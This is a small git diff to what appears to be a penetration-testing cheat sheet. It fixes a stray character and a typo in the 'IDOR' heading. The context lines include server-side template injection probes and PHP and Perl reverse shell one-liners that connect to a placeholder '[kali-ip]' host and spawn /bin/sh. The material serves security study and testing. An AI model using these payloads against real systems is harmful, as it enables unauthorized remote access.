@@ -133,7 +133,7 @@ ${7*7} # if 49 => freemarker or jinja or mako
 ${dir()} # if ['__M_caller', '__M_locals', '__M_writer', 'context', 'dir', 'pageargs'] => mako
 <%= 7 * 7 %> # if 49 => EJS
 ```
-s
+
 ## Command Injection 
 
 ### Fuzzing command injection 
@@ -175,7 +175,7 @@ php -r '$sock=fsockopen("[kali-ip]",4242);popen("/bin/sh -i <&3 >&3 2>&3", "r");
 perl -e 'use Socket;$i="[kali-ip]";$p=4242;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
 ```
 
-## IDOR (Insecure Direct Object Referenc)
+## IDOR (Insecure Direct Object Reference)
 
 ### Static file IDOR 
 ```shell
